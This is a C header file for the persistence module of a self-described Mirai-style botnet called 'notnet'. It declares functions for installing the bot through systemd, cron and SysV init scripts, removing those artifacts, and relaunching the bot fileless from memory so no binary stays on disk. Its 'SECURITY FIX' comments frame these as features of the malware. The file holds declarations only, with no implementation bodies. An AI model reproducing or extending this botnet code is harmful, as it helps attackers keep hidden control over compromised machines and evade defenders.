/*
 * notnet - Modern Mirai-Style Botnet
 * persist.h - Persistence module (systemd, cron, SysV init)
 */
#ifndef NOTNET_PERSIST_H
#define NOTNET_PERSIST_H

#include "protocol.h"

/* Persistence targets */
#define PERSIST_SYSTEMD   0x01
#define PERSIST_CRON      0x02
#define PERSIST_SYSV      0x04

/* ── Functions ───────────────────────────────────────────────── */
int detect_init_system(void);
int persist_install(notnet_bot_t *bot);
/* SECURITY FIX (#130): uninstall every launch point installed by
 * persist_install() (systemd unit, cron entries, SysV init script)
 * and delete the disk-backed binary. Best-effort: returns 0 if at
 * least one artifact was removed, -1 otherwise. */
int persist_remove(notnet_bot_t *bot);
/* SECURITY FIX (#84): RAM-only fileless mode. When persist_enabled=0 the
 * bot relaunches itself from an anonymous memfd (Linux) so no disk-backed
 * executable exists; no-op when persistence is enabled, when already
 * running fileless, or on platforms without memfd_create. */
int persist_become_fileless(notnet_bot_t *bot);
int install_systemd(const char *bin_path);
int install_cron(const char *bin_path);
int install_sysv(const char *bin_path);
int get_persist_path(char *buf, int len);

#endif /* NOTNET_PERSIST_H */
